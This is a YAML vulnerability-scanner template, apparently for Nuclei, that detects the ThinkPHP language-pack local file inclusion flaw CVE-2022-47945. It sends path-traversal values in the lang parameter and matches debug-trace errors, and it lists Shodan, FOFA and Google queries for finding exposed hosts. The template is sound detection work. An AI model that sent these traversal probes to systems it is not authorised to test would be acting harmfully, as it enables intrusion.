http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Call Stack
    - class="trace
  - status:
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?lang=../../thinkphp/base'
  - '{{BaseURL}}/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug'
  stop-at-first-match: true
id: CVE-2022-47945
info:
  author: kagamigawa
  classification:
    cpe: cpe:2.3:a:thinkphp:thinkphp:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-47945
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99557
    epss-score: 0.90086
  description: 'ThinkPHP Framework before 6.0.14 allows local file inclusion via the
    lang parameter when the language pack feature is enabled (lang_switch_on=true).
    An unauthenticated and remote attacker can exploit this to execute arbitrary operating
    system commands, as demonstrated by including pearcmd.php.

    '
  impact: 'This vulnerability can lead to unauthorized access, data leakage, and remote
    code execution.

    '
  metadata:
    fofa-query:
    - header="think_lang"
    - title="thinkphp"
    google-query: intitle:"thinkphp"
    max-request: 2
    product: thinkphp
    shodan-query:
    - title:"Thinkphp"
    - http.title:"thinkphp"
    - cpe:"cpe:2.3:a:thinkphp:thinkphp"
    vendor: thinkphp
    verified: true
  name: Thinkphp Lang - Local File Inclusion
  reference:
  - https://tttang.com/archive/1865/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-47945
  - https://github.com/top-think/framework/compare/v6.0.13...v6.0.14
  - https://github.com/top-think/framework/commit/c4acb8b4001b98a0078eda25840d33e295a7f099
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches and updates provided by the Thinkphp
    framework.

    '
  severity: critical
  tags: cve,cve2022,thinkphp,lfi,vkev,vuln
